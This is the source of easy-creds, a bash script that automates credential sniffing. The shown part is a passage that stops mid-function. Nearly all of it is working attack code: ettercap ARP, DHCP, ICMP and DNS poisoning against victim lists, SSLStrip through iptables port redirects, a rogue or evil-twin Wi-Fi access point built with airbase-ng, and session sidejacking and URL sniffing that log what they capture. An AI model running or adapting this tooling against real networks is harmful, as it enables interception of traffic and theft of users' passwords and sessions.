#!/bin/bash

##################################################################################################################
# easy-creds is a simple bash script which makes sniffing networks for credentials a little easier.              #
#                                                                                                                #
# J0hnnyBrav0 (@Brav0hax) & help from al14s (@al14s)                                                             #
##################################################################################################################
# v3.7.3 Garden of Your Mind - 12/11/2012
#
# Copyright (C) 2012  Eric Milam
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public 
# License as published by the Free Software Foundation; either version 2 of the License, or any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied 
# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along with this program; if not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
##################################################################################################################
#
#Clear some variables
unset wireless
unset etterlaunch
unset offset
unset eviltwin
unset vercompare
unset dosattack
unset karmasploit
unset x
unset y

#Save the starting location path
location=$PWD

#Find the ettercap version. Will be used for f_whichetter
ettercapversion=$(ettercap -v|grep 2012|grep -o "0.7.5")

#Create the log folder in PWD
if [ -z $1 ]; then
	logfldr=$PWD/easy-creds-$(date +%F-%H%M)
	mkdir -p $logfldr
else
	logfldr=$1
fi

# Catch ctrl-c input from user
trap f_Quit 2

#
# MISCELLANEOUS FUNCTIONS
#
##################################################
f_isxrunning(){

# Check to see if X is running
if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
	isxrunning=
else
	isxrunning=1
fi

# Uncomment the following line to launch attacks in a screen session instead of an xterm window.
#unset isxrunning

if [ -z $isxrunning ]; then
	echo -e "\n\e[1;31m[-] X Windows not detected, your attack will be launched in screen\e[0m\n"
	sleep 2
fi
}


##################################################
f_findpaths(){
# Grab the paths from the config file
updatedb &> /dev/null
easy_creds_config=$(locate easy-creds.paths)
source $easy_creds_config	
}

##################################################
f_xtermwindows(){
	x="0"					# x offset value
	y="0"					# y offset value
	width="100"				# width value
	height="7"				# height value
	yoffset="120"				# y offset
}

##################################################
f_checkexit(){
	if [ -z $clean ]; then
		f_Quit
	else
		rm -rf /tmp/ec &> /dev/null
		clear
		exit 2> /dev/null
	fi
}
##################################################
f_Quit(){
	echo -e "\n\n\e[1;33m[*] Please standby while we clean up your mess...\e[0m\n"
	sleep 3
	
	if [ -e /tmp/ec/sslstrip.pid ]; then kill $(cat /tmp/ec/sslstrip.pid); fi
	if [ ! -z $(pidof hamster) ]; then kill $(pidof hamster); fi
	if [ ! -z $(pidof ferret) ]; then kill $(pidof ferret); fi
	if [ ! -z $(pidof ettercap) ]; then kill $(pidof ettercap); fi
	if [ ! -z $(pidof urlsnarf) ]; then kill $(pidof urlsnarf); fi
	if [ ! -z $(pidof dsniff) ]; then kill $(pidof dsniff); fi

	if [ ! -z $wireless ]; then
	 kill $(pidof airbase-ng) $(pidof hamster) $(pidof ferret)  $(cat /tmp/ec/tail.pid)
	 if [ -e /tmp/ec/sleep.pid ]; then kill $(cat /tmp/ec/sleep.pid); fi
	 service dhcp3-server stop &> /dev/null
	 iptables --flush
	 iptables --table nat --flush
	 iptables --delete-chain
	 iptables --table nat --delete-chain
	 #for $MONMODE in $(airmon-ng | grep mon | cut -f1); do   #stop 'em all
	 	airmon-ng stop $MONMODE &> /dev/null
	 #done
	fi

	echo "0" > /proc/sys/net/ipv4/ip_forward

	if [ ! -z $dosattack ] ; then
	  airmon-ng stop $dosmon &> /dev/null
	  airmon-ng stop $airomon &> /dev/null
	fi

	if [ ! -z $karmasploit ] ; then
	 kill $(cat /tmp/ec/ec-karma-pid) &> /dev/null
	 kill $(cat /tmp/ec/ec-metasploit-pid) &> /dev/null
	fi

	if [ ! -z $fra ]; then
	 kill $(pidof radiusd) &> /dev/null
	 kill $(pidof hostapd) &> /dev/null
	 kill $(cat /tmp/ec/tail.pid) &> /dev/null
	 kill $(cat /tmp/ec/tshark.pid) &> /dev/null
	 mv $pathtoradiusconf/radiusd.conf.back $pathtoradiusconf/radiusd.conf
	 mv $pathtoradiusconf/clients.conf.back $pathtoradiusconf/clients.conf
	 echo "" > $freeradiuslog
	fi

	if [ "$mainchoice" == "5" ]; then
	 clear
	 rm -rf /tmp/ec
	 exit 2> /dev/null
	fi
	
	rm -rf /tmp/ec
	bash $0 $logfldr
	kill $$ 2> /dev/null
	clean=1
}


##################################################
#
# PREREQ AND CONFIGURATION FUNCTIONS
#
##################################################
f_addtunnel(){
	if [ -z $isxrunning ];then
		if [ -e /etc/default/isc-dhcp-server ]; then
			nano /etc/default/isc-dhcp-server
		elif [ -e /etc/sysconfig/dhcpd ]; then
			nano /etc/sysconfig/dhcpd
		else
			nano /etc/default/dhcp3-server
		fi
	else
		if [ -e /etc/default/isc-dhcp-server ]; then
	 		xterm -bg blue -fg white -geometry 90x25 -T "Add dhcpd Interface" -e nano /etc/default/isc-dhcp-server &
		elif [ -e /etc/sysconfig/dhcpd ]; then
			xterm -bg blue -fg white -geometry 90x25 -T "Add dhcpd Interface" -e nano /etc/sysconfig/dhcpd &
		else
	 		xterm -bg blue -fg white -geometry 90x25 -T "Add dhcpd Interface" -e nano /etc/default/dhcp3-server &
		fi

	fi
	f_prereqs
}


##################################################
f_nanoetter(){
	if [ -z $isxrunning ];then
	 nano /etc/etter.conf
	else
	 xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Etter Conf" -e nano /etc/etter.conf &
	fi
	f_prereqs
}


##################################################
f_nanoetterdns(){
	if [ -z $isxrunning ];then
	 nano /usr/local/share/ettercap/etter.dns
	else 
	 xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Etter DNS" -e nano /usr/local/share/ettercap/etter.dns &
	fi
	f_prereqs
}


##################################################
f_dhcp3install(){
	clear
	f_Banner

	echo -e "\e[1;33m[*] Installing dhcp-server, please stand by.\e[0m\n"
	if [ -e /etc/lsb-release ] || [ -e /etc/issue ]; then
	 apt-get update &> /dev/null && apt-get install dhcp3-server -y &> /dev/null
	elif [ -e /etc/redhat-release ]; then
	 yum install dhcp* &> /dev/null
	else
	 echo -e "\e[1;31m[-] I can't determine your OS, please install dhcp3-server manually\e[0m"
	fi
	echo -e "\n\e[1;32m[+] Finished installing dhcp3-server.\e[0m\n"
	sleep 3
	f_prereqs
}


##################################################
f_karmareqs(){
	clear
	f_Banner

	echo -e "\e[1;33m[*] Installing Karmetasploit Prerequisites, please standby.\e[0m\n"
	gem install activerecord
	echo -e "\n\e[1;32m [+] Finished installing Karmetasploit Prerequisites.\e[0m\n"
	sleep 3
	f_prereqs
}


##################################################
f_msfupdate(){
	clear
	f_Banner

	echo -e "\e[1;33m[*] Updating the Metasploit Framework, please stand by.\e[0m\n"
	msfupdate
	echo -e "\n\e[1;32m [+] Finished updating the Metasploit Framework.\e[0m\n"
	sleep 3
	f_prereqs
}


##################################################
f_aircrackupdate(){
	clear
	f_Banner

	echo -e "\n\e[1;33m[*] Updating aircrack-ng from SVN, please be patient...\e[0m"
	svn co http://trac.aircrack-ng.org/svn/trunk/ /tmp/ec/aircrack-ng
	cd /tmp/ec/aircrack-ng/
	make && make install > /dev/null
	echo -e "\n\e[1;32m[+] Finished updating Aircrack.\e[0m\n"
	sleep 2
	echo -e "\e[1;33m[*] Updating airodump-ng OUI.\e[0m\n"
	bash $airodumppath/airodump-ng-oui-update > /dev/null
	echo -e "\n\e[1;32m[+] Finished updating Aircrack.\e[0m\n"
	sleep 3

	cd $location
	f_prereqs
}


##################################################
f_sslstrip_vercheck(){
	clear
	f_Banner
	echo -e "\n\e[1;33m[*] Checking the thoughtcrime website for the latest version of SSLStrip...\e[0m\n"

	#Get the installed version
	echo cat $sslstrippath/setup.py|grep version|cut -d "'" -f2
	installedver=$(cat $sslstrippath/setup.py|grep version|cut -d "'" -f2)

	# Change to tmp folder to keep things clean then get the index.html from thoughtcrime.com for SSLStrip
	cd /tmp/ec
	wget -q http://www.thoughtcrime.org/software/sslstrip/index.html
	latestver=$(cat index.html | grep "cd sslstrip"| cut -d "-" -f2|cut -d "<" -f1)
	cd $location

	echo -e "\n\e[1;33m[*] Installed version of SSLStrip: $installedver\e[0m\n"
	echo -e "\nLatest version of SSLStrip: $latestver\n"

	if [ $(echo "$installedver < $latestver"|bc) == "1" ]; then
	  echo -e "\n\e[1;33m[*] You have version\e[0m \e[1;31m$installedver\e[0m \e[1;33m installed, version\e[0m \e[1;32m$latestver\e[0m \e[1;33m is available.\e[0m\n"

	  read -p "Would you like to install the latest version? [y/N]: " yn
	  if [ $(echo ${yn} | tr 'A-Z' 'a-z') == 'y' ]; then f_sslstripupdate; fi
	else
	  echo -e "\n\e[1;32m[+] Looks like you're running the latest version available.\e[0m \n"
	  sleep 3
	fi
	f_prereqs
}


##################################################
f_sslstripupdate(){
	clear
	f_Banner

	echo -e "\n\e[1;31m[-] This will install SSLStrip from the thoughtcrime website, not the repositories.\e[0m\n\e[1;33m[*] Hit return to continue or ctrl-c to cancel and return to main menu.\e[0"
	read

	cp -R "$sslstrippath" /tmp/ec/sslstrip-$installedver

	echo -e "\n\e[1;33m[*] Downloading the tar file...\e[0m"
	cd /tmp/ec/
	wget -q http://www.thoughtcrime.org/software/sslstrip/sslstrip-$latestver.tar.gz

	echo -e "\n\e[1;33m[*] Installing the latest version of SSLStrip...\e[0m"
	tar -xvf sslstrip-$latestver.tar.gz
	mv -f /tmp/ec/sslstrip-$latestver $sslstrippath/sslstrip
	python $sslstrippath/setup.py install &> /dev/null
	cd $location

	echo -e "\n\e[1;32m[+] Version $latestver has been installed.\e[0m\n"
	sleep 2
}
##################################################
f_howtos(){
	xdg-open http://www.youtube.com/user/Brav0Hax/videos &
	f_prereqs 
}
##################################################
f_pbs(){
	xdg-open http://www.youtube.com/watch?v=OFzXaFbxDcM &
	f_mainmenu
}
##################################################
#
# POISONING ATTACK FUNCTIONS
#
##################################################
f_getvics(){
	read -p "Do you have a populated file of victims to use? [y/N]: " VICFILE

	if [ "$(echo ${VICFILE} | tr 'A-Z' 'a-z')" == "y" ]; then
		VICLIST=
		p=
		if [ -e /tmp/victims ]; then p="[/tmp/victims]"; fi
		while [ -z $VICLIST ]; do 
			read -e -p "Path to the victim list file $p : " VICLIST
			if [ -z $VICLIST ] && [ -n $p ]; then VICLIST="/tmp/victims"; fi
		done
	else
		VICS=
		while [ -z $VICS ]; do read -p "IP address or range of IPs to poison (ettercap format): " VICS; done
	fi
	GW=
	p=$(route | grep default | awk '{print $2}')
	while [ -z $GW ]; do 
	 read -p "IP address of the gateway [$p] : " GW
	 if [ -z $GW ];then GW=$p; fi
	done
	f_whichettercap
}


##################################################
f_whichettercap(){

	if [ "$VICFILE" == "y" ]; then
	 case $poisoningchoice in
	   2) etterlaunch=1 ;;
	   3) etterlaunch=3 ;;
	   5) etterlaunch=8 ;;
	 esac
	else
	 case $poisoningchoice in
	   2) etterlaunch=2 ;;
	   3) etterlaunch=4 ;;
	   5) etterlaunch=9 ;;
	 esac
	fi
}


##################################################
f_HostScan(){
	clear
	f_Banner

	range=
	while [ -z "$range" ]; do read -p "Enter your target network range (nmap format): " range; done

	echo -e "Performing an ARP scan to identify live devices - excluding our IPs.\n\nThis may take a bit.\n"

	#take our addresses out of the mix  ;)
	myaddrs=$(printf "%s," $(ifconfig | grep "inet" | grep -v "127.0.0.1" | awk '{print $2}' | sed 's/addr://g'))

	nmap -PR -n -sn $range --exclude $myaddrs -oN /tmp/ec/nmap.scan

	grep -e report -e MAC /tmp/ec/nmap.scan | sed '{ N; s/\n/ /; s/Nmap scan report for //g; s/MAC Address: //g; s/ (.\+//g; s/$/ -/; }' > /tmp/victims

	echo -e "\n\e[1;33m[*] Your victim host list is at /tmp/victims.\e[0m\n"
	echo -e "\n\e[1;31m[-] Remember to remove any IPs that should not be poisoned!\e[0m\n" 

	read -p "Would you like to edit the victim host list? [y/N] : " yn
	if [ $(echo $yn | tr 'A-Z' 'a-z') == "y" ]; then 
		if [ -z $isxrunning ];then
		 nano /tmp/victims
		else 
		 xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Victims List" -e nano /tmp/victims &
		fi
	fi
	f_poisoning
}


##################################################
f_setup(){
	echo -e "Network Interfaces:\n"
	ifconfig | awk '/Link encap:Eth/ {print;getline;print}' | sed '{ N; s/\n/ /; s/Link en.*.HWaddr//g; s/ Bcast.*//g; s/UP.*.:1//g; s/inet addr/IP/g; }' | sed '$a\\n'

	IFACE=
	while [ -z $IFACE ]; do
	 read -p "Interface connected to the network (ex. eth0): " IFACE
	done

	echo -e "\n\n\e[1;33m[*] Setting up iptables to handle traffic routing...\e[0m\n"
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT
	iptables -t nat -A POSTROUTING -o $IFACE -j MASQUERADE
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
	sleep 3

	f_xtermwindows
}


##################################################
f_Standard(){
	clear
	f_Banner
	f_setup
	f_getvics
	f_finalstage
	f_mainmenu
}


##################################################
f_Oneway(){
	clear
	f_Banner
	f_setup
	f_getvics
	f_finalstage
	f_mainmenu
}


##################################################
f_DHCPPoison(){
	clear
	f_Banner
	f_setup
	etterlaunch=5

	POOL=
	while [ -z "$POOL" ]; do read -p "Pool of IP address to assign to your victims: " POOL;	done
	MASK=
	while [ -z "$MASK" ]; do read -p "Netmask to assign to your victims: " MASK; done
	DNS=
	while [ -z "$DNS" ]; do	read -p "DNS IP to assign to your victims: " DNS; done

	f_finalstage
	f_mainmenu
}


##################################################
f_DNSPoison(){
	clear
	f_Banner
	f_setup
	f_getvics
	f_finalstage
	f_mainmenu
}


##################################################
f_ICMPPoison(){
	clear
	f_Banner
	f_setup
	etterlaunch=6

	GATEMAC=
	while [ -z "$GATEMAC" ]; do read -p "MAC address of the gateway: " GATEMAC; done
	GATEIP=
	while [ -z "$GATEIP" ]; do read -p "IP address of the gateway: " GATEIP; done

	f_finalstage
	f_mainmenu
}


##################################################
f_sidejack(){
	echo -e "\n\e[1;33m[*] Starting Hamster & Ferret...\e[0m\n"
	cd $logfldr
	screen -dmS SideJack -t ferret bash -c "$ferretpath/ferret -i $IFACE"
	sleep 2
	screen -S SideJack -t hamster -X screen $hamsterpath/hamster
	cd $location
	sleep 2
	echo -e "\n\e[1;33m[*] Run firefox and type http://hamster\e[0m\n"
	echo -e "\e[1;33m[*] Don't forget to set the proxy to 127.0.0.1:1234\e[0m\n"
	sleep 5
}


##################################################
f_ecap(){
	echo -e "\n\e[1;33m[*] Launching ettercap, poisoning specified hosts.\e[0m\n"
	y=$(($y+$yoffset))

	case $etterlaunch in
	1) type="[arp:remote]"
	   c="ettercap -a /etc/etter.conf -M arp:remote -T -j $VICLIST -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$GW/ //" ;;
	2) type="[arp:remote]"
	   c="ettercap -a /etc/etter.conf -M arp:remote -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$GW/ /$VICS/" ;;
	3) type="[arp:oneway]"
	   c="ettercap -a /etc/etter.conf -M arp:oneway -T -j $VICLIST -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE // /$GW/" ;;
	4) type="[arp:oneway]"
	   c="ettercap -a /etc/etter.conf -M arp:oneway -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$VICS/ /$GW/" ;;
	5) type="[dhcp:$POOL/$MASK/$DNS/]"
	   c="ettercap -a /etc/etter.conf -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE -M dhcp:$POOL/$MASK/$DNS/" ;;
	6) type="[icmp:$GATEMAC/$GATEIP]"
	   c="ettercap -a /etc/etter.conf -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE -M icmp:$GATEMAC/$GATEIP" ;;
	7) type="[tunnel]"
	   c="ettercap -a /etc/etter.conf -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $TUNIFACE // //" ;;
	8) type="[dns_spoof / arp]"
	   c="ettercap -a /etc/etter.conf -P dns_spoof -M arp -T -j $VICLIST -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$GW/ //" ;;
	9) type="[dns_spoof / arp]"
	   c="ettercap -a /etc/etter.conf -P dns_spoof -M arp -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$GW/ /$VICS/" ;;
	esac

	if [ ! -z $isxrunning ]; then
	   xterm -geometry "$width"x$height-$x+$y -T "Ettercap - $type" -l -lf $logfldr/ettercap$(date +%F-%H%M).txt -bg white -fg black -e $c &
	else
	   screen -S easy-creds -t ettercap -X screen $c
	fi
	ecpid=$(pidof ettercap)
}


##################################################
f_ecap_assimilation(){
	#Used if version of ettercap is 0.7.5 and above. Target specification format changed for IPv6
	
	echo -e "\n\e[1;33m[*] Launching ettercap, poisoning specified hosts.\e[0m\n"
	y=$(($y+$yoffset))

	case $etterlaunch in
	1) type="[arp:remote]"
	   c="ettercap -a /etc/etter.conf -M arp:remote -T -j $VICLIST -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$GW// ///" ;;
	2) type="[arp:remote]"
	   c="ettercap -a /etc/etter.conf -M arp:remote -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$GW// /$VICS//" ;;
	3) type="[arp:oneway]"
	   c="ettercap -a /etc/etter.conf -M arp:oneway -T -j $VICLIST -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /// /$GW//" ;;
	4) type="[arp:oneway]"
	   c="ettercap -a /etc/etter.conf -M arp:oneway -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$VICS// /$GW//" ;;
	5) type="[dhcp:$POOL/$MASK/$DNS/]"
	   c="ettercap -a /etc/etter.conf -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE -M dhcp:$POOL/$MASK/$DNS/" ;;
	6) type="[icmp:$GATEMAC/$GATEIP]"
	   c="ettercap -a /etc/etter.conf -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE -M icmp:$GATEMAC/$GATEIP" ;;
	7) type="[tunnel]"
	   c="ettercap -a /etc/etter.conf -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $TUNIFACE /// ///" ;;
	8) type="[dns_spoof / arp]"
	   c="ettercap -a /etc/etter.conf -P dns_spoof -M arp -T -j $VICLIST -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$GW// ///" ;;
	9) type="[dns_spoof / arp]"
	   c="ettercap -a /etc/etter.conf -P dns_spoof -M arp -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$GW// /$VICS//" ;;
	esac

	if [ ! -z $isxrunning ]; then
	   xterm -geometry "$width"x$height-$x+$y -T "Ettercap - $type" -l -lf $logfldr/ettercap$(date +%F-%H%M).txt -bg white -fg black -e $c &
	else
	   screen -S easy-creds -t ettercap -X screen $c
	fi
	ecpid=$(pidof ettercap)
}

##################################################
#
# FAKE AP ATTACK FUNCTIONS
#
##################################################
f_fakeapAttack(){

	wireless=1
	offset=1

	# Credit to Lucafa's post on the Offensive-Security forums, used as a base
	clear
	f_Banner
	f_xtermwindows

	SIDEJACK=
	   read -p "Would you like to include a sidejacking attack? [y/N]: " SIDEJACK
	   SIDEJACK="$(echo ${SIDEJACK} | tr 'A-Z' 'a-z')"

	echo -e "Network Interfaces:\n"
	ifconfig | awk '/Link encap:Eth/ {print;getline;print}' | sed '{ N; s/\n/ /; s/Link en.*.HWaddr//g; s/ Bcast.*//g; s/UP.*.:1//g; s/inet addr/IP/g; }' | sed '$a\\n'

	IFACE=
	while [ -z "$IFACE" ]; do read -p "Interface connected to the internet (ex. eth0): " IFACE; done

	wirelesscheck=$(airmon-ng | grep 'wlan')

	if [ ! -z "$wirelesscheck" ]; then 
	 airmon-ng
	else
	 echo -e "\n\e[1;31m[-] I can't find a wireless interface to display...continuing anyway\e[0m\n"
	 sleep 5
	fi

	WIFACE=
	while [ -z "$WIFACE" ]; do read -p "Wireless interface name (ex. wlan0): " WIFACE; done

	if [ -z $eviltwin ]; then
		ESSID=
		while [ -z "$ESSID" ]; do read -p "ESSID you would like your rogue AP to be called, example FreeWiFi: " ESSID; done
		CHAN=
		while [ -z "$CHAN" ]; do read -p "Channel you would like to broadcast on: " CHAN; done
		airmon-ng start $WIFACE $CHAN &> /dev/null
	elif [ "$eviltwin" == "1" ]; then
	  airmon-ng start $WIFACE &> /dev/null
	fi

	modprobe tun

	echo -e "\n\e[1;33m[*] Your interface has now been placed in Monitor Mode\e[0m\n"
	airmon-ng | grep mon | sed '$a\\n'
	MONMODE=
	while [ -z "$MONMODE" ]; do read -p "Enter your monitor enabled interface name, (ex: mon0): " MONMODE; done
	TUNIFACE=
	while [ -z "$TUNIFACE" ]; do read -p "Enter your tunnel interface, example at0: " TUNIFACE; done

	read -p "Do you have a dhcpd.conf file to use? [y/N]: " DHCPFILE
	DHCPFILE=$(echo $DHCPFILE | tr 'A-Z' 'a-z')

	if [ "$DHCPFILE" == "y" ]; then
	  f_dhcpconf
	else
	  f_dhcpmanual
	fi

	f_dhcptunnel
}


##################################################
f_dhcpconf(){
	
	dhcpdconf=
	if [ -d /etc/dhcp3 ]; then #Ubuntu/Debian dhcp3-server
		dhcpdconf="/etc/dhcp3/dhcpd.conf"
	elif [ -e /etc/dhcpd.conf ]; then #redhat/fedora old
		dhcpdconf="/etc/dhcpd.conf"
	else
		dhcpdconf="/etc/dhcp/dhcpd.conf" #Ubuntu/Debian/RH/Fedora isc-dhcp-server
	fi
	
	valid=
	while [[ $valid != 1 ]]; do
	 read -e -p "Path to the dhcpd.conf file [$dhcpdconf]: " DHCPPATH
	 if [ -z "$DHCPPATH" ]; then DHCPPATH=$dhcpdconf; fi
	 
	if [ ! -f "$DHCPPATH" ]; then
		echo -e "File not found - $DHCPPATH\n"
	 else
		valid=1
	 fi
	done

	cat $DHCPPATH > /tmp/ec/dhcpd.conf
	mv /tmp/ec/dhcpd.conf $dhcpdconf
	DHCPPATH=$dhcpdconf

	#If your DHCP conf file is setup properly, this will work, otherwise you need to tweak it
	ATNET=$(cat $DHCPPATH |grep -i subnet|cut -d" " -f2)
	ATIP=$(cat $DHCPPATH |grep -i "option routers"|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
	ATSUB=$(cat $DHCPPATH |grep -i subnet|cut -d" " -f4)
	ATCIDR=$(ipcalc -b $ATNET/$ATSUB|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\/[0-9]\{1,2\}')

}


##################################################
f_ipcalc(){
	
	dhcpdconf=
	if [ -d /etc/dhcp3 ]; then
		dhcpdconf="/etc/dhcp3/dhcpd.conf"
	elif [ -e /etc/sysconfig/dhcpd ]; then
		dhcpdconf="/etc/dhcpd.conf"
	else
		dhcpdconf="/etc/dhcp/dhcp.conf"
	fi
	
	DHCPPATH=$dhcpdconf

	#use ipcalc to complete the DHCP setup
	ipcalc "$ATCIDR" > /tmp/ec/atcidr
	ATNET=$(cat /tmp/ec/atcidr|grep Address| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
	ATIP=$(cat /tmp/ec/atcidr|grep HostMin| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
	ATSUB=$(cat /tmp/ec/atcidr|grep Netmask| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
	ATBROAD=$(cat /tmp/ec/atcidr|grep Broadcast| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
	ATLSTARTTMP=$(cat /tmp/ec/atcidr|grep HostMin| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|cut -d"." -f1-3)
	ATLSTART=$(echo $ATLSTARTTMP.100)
	ATLENDTMP=$(cat /tmp/ec/atcidr|grep HostMax| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|cut -d"." -f1-3)
	ATLEND=$(echo $ATLENDTMP.200)

	echo -e "\n\n\e[1;33m[*] Creating a dhcpd.conf to assign addresses to clients that connect to us.\e[0m"
	echo "ddns-update-style none;" > $DHCPPATH
	echo "authoritative;"  >> $DHCPPATH
	echo "log-facility local7;"  >> $DHCPPATH
	echo "subnet $ATNET netmask $ATSUB {"  >> $DHCPPATH
	echo "	range $ATLSTART $ATLEND;"  >> $DHCPPATH
	echo "	option domain-name-servers $ATDNS;"  >> $DHCPPATH
	echo "	option routers $ATIP;"  >> $DHCPPATH
	echo "	option broadcast-address $ATBROAD;"  >> $DHCPPATH
	echo "	default-lease-time 600;" >> $DHCPPATH
	echo "	max-lease-time 7200;"  >> $DHCPPATH
	echo "}" >> $DHCPPATH
}


##################################################
f_dhcpmanual(){
	ATCIDR=
	while [ -z "$ATCIDR" ]; do
	  read -p "Network range for your tunneled interface, example 10.0.0.0/24: " ATCIDR
	  if [[ ! $ATCIDR =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,2}$ ]]; then ATCIDR=; fi
	done

	ATDNS=
	while [ -z "$ATDNS" ]; do read -p "Enter the IP address for the DNS server, example 8.8.8.8: " ATDNS; done

	f_ipcalc
}


##################################################
f_dhcptunnel(){
	etterlaunch=7

	# airbase-ng is going to create our fake AP with the SSID we specified
	echo -e "\n\e[1;33m[*] Launching Airbase with your settings.\e[0m"

	if [ "$eviltwin" == "1" ] && [ -z $isxrunning ]; then
	  screen -dmS easy-creds -t Airbase-NG airbase-ng -P -C 60 -e "$ESSID" $MONMODE
	elif [ "$eviltwin" == "1" ] && [ ! -z $isxrunning ]; then
	  xterm -geometry "$width"x$height-$x+$y -T "Airbase-NG" -e airbase-ng -P -C 60 -e "$ESSID" $MONMODE &
	elif [ -z $isxrunning ]; then
	  screen -dmS easy-creds -t Airbasg-NG airbase-ng -e "$ESSID" -c $CHAN $MONMODE
	else
	  xterm -geometry "$width"x$height-$x+$y -T "Airbase-NG" -e airbase-ng -e "$ESSID" -c $CHAN $MONMODE &
	fi
	sleep 7

	echo -e "\n\e[1;33m[*] Configuring tunneled interface.\e[0m"
	ifconfig "$TUNIFACE" up
	ifconfig "$TUNIFACE" "$ATIP" netmask "$ATSUB"
	ifconfig "$TUNIFACE" mtu 1500
	route add -net "$ATNET" netmask "$ATSUB" gw "$ATIP" dev "$TUNIFACE"
	sleep 2

	echo -e "\n\e[1;33m[*] Setting up iptables to handle traffic seen by the tunneled interface.\e[0m"
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT
	iptables -t nat -A POSTROUTING -o $IFACE -j MASQUERADE
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
	sleep 2

	echo -e "\n\e[1;33m[*] Launching Tail.\e[0m"
	if [ -z $isxrunning ]; then
	 screen -S easy-creds -t DMESG -X tail -f /var/log/messages
	else
	 y=$(($y+$yoffset))
	 xterm -geometry "$width"x$height-$x+$y -T "DMESG" -bg black -fg red -e tail -f /var/log/messages &
	fi
	echo $! > /tmp/ec/tail.pid
	sleep 3

	echo -e "\n\e[1;33m[*] DHCP server starting on tunneled interface.\e[0m\n"
	if [ -e /etc/dhcp3/dhcpd.conf ]; then
		dhcpd3 -q -cf $DHCPPATH -pf /var/run/dhcp3-server/dhcpd.pid $TUNIFACE &
	elif [ -e /etc/sysconfig/dhcpd ]; then
		systemctl start dhcpd.service
	else
		service dhcpd start
	fi
	
	sleep 3
	f_finalstage
	f_mainmenu
}


##################################################
f_finalstage(){

	if [ -z $wireless ]; then
	   read -p "Would you like to include a sidejacking attack? [y/N]: " SIDEJACK
	   SIDEJACK="$(echo ${SIDEJACK} | tr 'A-Z' 'a-z')"
	fi

	if [ "$etterlaunch" -lt "8" ];then
		if [ ! -z $isxrunning ]; then
		  echo -e "\n\e[1;33m[*] Launching SSLStrip...\e[0m\n"
		  if [ "$offset" == "1" ]; then
	  	    y=$(($y+$yoffset))
		  fi
		  sslstripfilename=sslstrip$(date +%F-%H%M).log
		  xterm -geometry "$width"x$height-$x+$y -bg blue -fg white -T "SSLStrip" -e python $sslstrippath/sslstrip.py -pfk -w $logfldr/$sslstripfilename &
		else
		  echo -e "\n\e[1;33m[*] Launching SSLStrip...\e[0m\n"
		  sslstripfilename=sslstrip$(date +%F-%H%M).log
		  screen -dmS easy-creds -t sslstrip python $sslstrippath/sslstrip.py -pfk -w $logfldr/$sslstripfilename
		fi
	fi
	echo $! > /tmp/ec/sslstrip.pid
	sleep 2
	
	if [ -z "$ettercapversion" ]; then
		f_ecap
	else
		f_ecap_assimilation
	fi
	
	sleep 3

	echo -e "\n\e[1;33m[*] Configuring IP forwarding...\e[0m\n"
	echo "1" > /proc/sys/net/ipv4/ip_forward
	sleep 3

	echo -e "\n\e[1;33m[*] Launching URLSnarf...\e[0m\n"
	if [ "$wireless" == "1" ]; then
		y=$(($y+$yoffset))
		xterm -geometry "$width"x$height-$x+$y -T "URL Snarf" -l -lf $logfldr/urlsnarf-$(date +%F-%H%M).txt -bg black -fg green -e urlsnarf  -i $TUNIFACE &
		sleep 3
	elif [ "$wireless" == "1" ] && [ -z $isxrunning ]; then
		screen -S easy-creds -t urlsnarf -X screen urlsnarf -i $TUNIFACE
	elif [ -z $wireless ] && [ -z $isxrunning ]; then
